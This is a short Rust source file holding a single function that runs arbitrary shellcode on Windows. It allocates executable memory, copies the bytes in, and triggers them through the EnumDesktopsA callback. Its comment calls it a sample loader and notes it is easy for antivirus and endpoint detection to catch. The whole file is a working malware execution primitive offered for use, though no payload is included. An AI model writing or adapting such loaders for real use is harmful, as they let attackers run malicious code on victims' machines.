use winapi::um::{handleapi::CloseHandle, memoryapi::VirtualAlloc, winnt::{RtlMoveMemory, MEM_COMMIT, PAGE_EXECUTE_READWRITE}, winuser::{EnumDesktopsA, GetProcessWindowStation}};

// THis is just an sample func to execute shellcode.. so vulnerable to EDR/AV...

pub fn shell_exec(shellcode: Vec<u8>){
    unsafe {
        let mem = VirtualAlloc(
            std::ptr::null_mut(),
            shellcode.len(),
            MEM_COMMIT,
            PAGE_EXECUTE_READWRITE,
        );
        
        if !mem.is_null() {
            RtlMoveMemory(mem, shellcode.as_ptr() as *mut winapi::ctypes::c_void, shellcode.len());
            EnumDesktopsA(GetProcessWindowStation(), std::mem::transmute(mem), 0);
            CloseHandle(mem);
        }
    }
}
